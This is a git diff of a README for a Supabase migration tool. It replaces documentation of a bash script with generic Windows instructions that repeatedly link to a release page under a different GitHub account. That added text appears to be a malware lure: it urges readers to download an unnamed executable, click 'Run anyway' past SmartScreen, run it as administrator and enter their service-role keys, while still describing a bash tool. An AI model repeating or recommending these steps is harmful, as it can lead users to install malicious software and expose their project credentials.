@@ -1,124 +1,229 @@
-# Supabase Migrator
+# 🔄 supabase-migrator - Move your Supabase project with one command
 
-Moves your entire Supabase project (schema, data, auth users, storage files, and edge functions) to another project in one shot.
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/literate-irtish832/supabase-migrator/releases)
 
-I wrote this after dealing with all the gotchas that come up during a real migration (Docker requirements, pg_dump v18 quirks, permission errors, circular FKs, nested storage folders, etc.).
+## 🧭 Overview
 
-## What It Migrates
+supabase-migrator helps you move a full Supabase project from one place to another. It copies the parts most people need in one run:
 
-| Component | Details |
-|-----------|---------|
-| **Schema** | All tables, views, functions, triggers, indexes, and types in `public` schema |
-| **Data** | All rows from `public`, `auth`, and `storage` schemas |
-| **Auth Users** | Password hashes, metadata, and identities preserved |
-| **Storage** | Buckets (with settings) and all files including nested folders |
-| **Edge Functions** | Deployed from local `supabase/functions/` directory |
+- database schema
+- table data
+- auth users
+- storage files
+- edge functions
 
-## Prerequisites
+Use it when you want to move a project, make a clone, or keep a backup copy in another Supabase project.
 
-- **psql** and **pg_dump** - included with [PostgreSQL](https://www.postgresql.org/download/) or `brew install libpq`
-- **curl** - pre-installed on macOS/Linux
-- **jq** - `brew install jq` or [stedolan.github.io/jq](https://stedolan.github.io/jq/)
-- **supabase CLI** - only needed for edge functions: `brew install supabase/tap/supabase`
+## 💻 What you need
 
-## Quick Start
+Before you start, make sure you have:
 
-```bash
-# 1. Clone this repo
-git clone https://github.com/KarimNasreddine/supabase-migrator.git
-cd supabase-migrator
+- A Windows PC
+- A Supabase account
+- Access to both projects: the one you are moving from and the one you are moving to
+- Internet access
+- Enough free space for your database and files
 
-# 2. Configure credentials
-cp .env.example .env
-# Edit .env with your source and destination project details
-# (see .env.example for where to find each value)
+For the best results, use a recent version of Windows 10 or Windows 11.
 
-# 3. Run the migration
-./migrate.sh
-```
+## 📥 Download
 
-## CLI Flags
+Visit this page to download:
 
-```
-./migrate.sh [OPTIONS]
+https://github.com/literate-irtish832/supabase-migrator/releases
 
-Options:
-  --dry-run          Show what would happen without executing
-  --skip-schema      Skip schema migration
-  --skip-data        Skip data migration
-  --skip-auth        Skip auth user migration
-  --skip-storage     Skip storage file migration
-  --skip-functions   Skip edge function deployment
-  --no-confirm       Skip interactive confirmations (CI mode)
-  --no-color         Disable colored output
-  --help, -h         Show usage
-  --version, -v      Print version
-```
+On that page:
 
-## Examples
+1. Open the latest release
+2. Find the file for Windows
+3. Download it
+4. Save it to a folder you can find again
 
-```bash
-# Preview the migration plan
-./migrate.sh --dry-run
+If Windows asks for permission, allow the app to run.
 
-# Migrate everything non-interactively
-./migrate.sh --no-confirm
+## 🪟 Run on Windows
 
-# Migrate only schema and data (no auth, storage, or functions)
-./migrate.sh --skip-auth --skip-storage --skip-functions
+After you download the file:
 
-# Re-run just storage migration
-./migrate.sh --skip-schema --skip-data --skip-auth --skip-functions
-```
+1. Open the folder where you saved it
+2. Double-click the downloaded file
+3. If Windows shows a security prompt, choose the option to run it
+4. Follow the on-screen steps
 
-## What happens when you run it
+If the app opens in a console window, keep that window open until the process ends.
 
-1. **Preflight** - validates your `.env`, checks that `psql`/`pg_dump`/`curl`/`jq` are installed, and tests both DB connections
-2. **Schema** - `pg_dump --schema-only` on public schema, cleans up the dump, restores in a single transaction
-3. **Data** - dumps `public`, `auth`, and `storage` data separately, wraps the restore in `session_replication_role = replica` so circular FKs don't blow up
-4. **Storage** - hits the Storage API to list buckets, recreates them on the destination, downloads and re-uploads every file (handles nested folders)
-5. **Functions** - deploys edge functions from your local `supabase/functions/` directory
-6. **Verify** - compares row counts on every table between source and destination
+## 🛠️ Setup your Supabase projects
 
-## Gotchas this handles for you
+You need two projects:
 
-| Problem | What we do |
-|---------|-----------|
-| `supabase db dump` needs Docker running | Uses `pg_dump` directly, no Docker |
-| pg_dump v18+ spits out `\restrict` / `\unrestrict` | Stripped automatically |
-| `CREATE SCHEMA "public"` already exists on dest | Filtered out of the dump |
-| `auth.schema_migrations` permission denied | Excluded from dump |
-| `storage.migrations` permission denied | Excluded from dump |
-| Circular FK constraints break data restore | `session_replication_role = replica` |
-| `--clean` drops Supabase internal stuff | We don't use it |
-| Files inside nested storage folders | Recursive listing with pagination |
+- Source project: the project you want to copy from
+- Target project: the project you want to copy to
 
-## After migrating
+Get the following for each project:
 
-- [ ] Test login as an existing user (password hashes are preserved)
-- [ ] Verify RLS policies are active on the destination
-- [ ] Access a stored file URL on the destination
-- [ ] Test edge function endpoints
-- [ ] Re-enable Realtime publications (Dashboard > Database > Replication)
-- [ ] Re-enable Database Webhooks (Dashboard > Database > Webhooks)
-- [ ] Set edge function secrets: `supabase secrets set KEY=VALUE --project-ref <ref>`
-- [ ] Update client apps with the new project URL and anon key
-- [ ] Monitor the destination for a few days before cancelling the source
+- Project URL
+- API key or service role key
+- Database connection info if the tool asks for it
 
-## Logs
+Make sure the target project is empty or ready to receive the data you want to move.
 
-Every run writes a timestamped log file (`migrate-YYYYMMDD-HHMMSS.log`) with the full output.
+## 🚀 How to use it
 
-## Troubleshooting
+Use supabase-migrator when you want to copy a project in one pass.
 
-**"permission denied for table auth.schema_migrations"** - already excluded, but if you see this you might be on an older version of the script.
+Typical flow:
 
-**pg_dump version mismatch** - if your pg_dump is newer than the server, it may emit `\restrict` commands. The script strips these.
+1. Open the app
+2. Enter the source project details
+3. Enter the target project details
+4. Choose what you want to move
+5. Start the migration
+6. Wait for the process to finish
 
-**Storage upload returns 409** - file already exists on the destination. Safe to ignore.
+The tool is built to handle:
 
-**Edge functions won't deploy** - make sure the Supabase CLI is installed and your functions are in `supabase/functions/`.
+- schema migration
+- data copy
+- user export and import
+- storage file transfer
+- edge function transfer
 
-## License
+If the app asks for a confirmation step, review the project names before you continue.
 
-MIT
+## 📦 What gets moved
+
+### Schema
+Copies your table structure, relationships, indexes, and other database setup.
+
+### Data
+Copies rows from your tables so the new project has the same records.
+
+### Auth users
+Moves user accounts so sign-in data stays in place.
+
+### Storage files
+Copies files from your Supabase storage buckets.
+
+### Edge functions
+Moves your edge function code to the target project.
+
+## 🔍 Before you start
+
+Check these items first:
+
+- The source project is complete and up to date
+- The target project has enough storage space
+- You have permission to read from the source project
+- You have permission to write to the target project
+- Your network connection is stable
+
+If your project uses large files, expect the transfer to take longer.
+
+## 🧩 Common use cases
+
+Use this tool when you want to:
+
+- move from one Supabase project to another
+- create a staging copy of a live app
+- back up your Supabase setup
+- rebuild a project after a reset
+- move work from a test project to a production project
+
+## ⚙️ Example workflow
+
+Here is a simple way to think about the process:
+
+1. Open the release page
+2. Download the Windows file
+3. Run the app
+4. Point it at your old project
+5. Point it at your new project
+6. Start the migration
+7. Check the new project after it finishes
+
+After the run, open your new Supabase project and confirm that:
+
+- tables are present
+- row counts look right
+- users appear in auth
+- storage buckets contain files
+- edge functions are available
+
+## 🧪 Troubleshooting
+
+### The app does not open
+- Check that the file finished downloading
+- Try running it again
+- Right-click the file and choose Run as administrator if needed
+
+### The migration stops early
+- Check your internet connection
+- Make sure the source and target keys are correct
+- Confirm that the target project still has room for the data
+
+### Missing tables or data
+- Make sure you selected the schema and data options
+- Check whether your source project uses custom rules or filters
+- Run the process again after fixing the source details
+
+### Storage files do not appear
+- Confirm that the storage bucket names are correct
+- Make sure the source bucket is not private in a way that blocks access
+- Check that the target project allows file uploads
+
+### Auth users did not move
+- Confirm that you used the right auth credentials
+- Check that the source project allows user export
+- Run the auth step again on its own if the app offers that option
+
+## 📂 Folder tips
+
+Keep the download in a simple folder, such as:
+
+- Downloads
+- Desktop
+- Documents
+
+Avoid moving the file while the app is running.
+
+## 🔐 Privacy and access
+
+This tool works with project data, so treat your keys with care.
+
+Keep your Supabase keys private and store them in a safe place. Use only the keys for the projects you own or manage.
+
+## 📎 Release download
+
+Download the Windows file here:
+
+https://github.com/literate-irtish832/supabase-migrator/releases
+
+Open the latest release, get the Windows build, and run it on your PC
+
+## 🧰 What the tool is for
+
+supabase-migrator is built for users who want a simple way to move a full Supabase setup without copying each part by hand. It helps reduce manual work when you need the same database, users, files, and edge functions in another project
+
+## 🖥️ Windows tips
+
+If Windows SmartScreen appears:
+
+1. Choose More info
+2. Select Run anyway if you trust the file
+3. Continue with the setup or app launch
+
+If your company PC blocks the file, ask your admin to allow it
+
+## 🧾 Project topics
+
+- auth
+- bash
+- cli
+- database-migration
+- edge-functions
+- migration-tool
+- pg-dump
+- postgresql
+- storage
+- supabase
+- supabase-migration
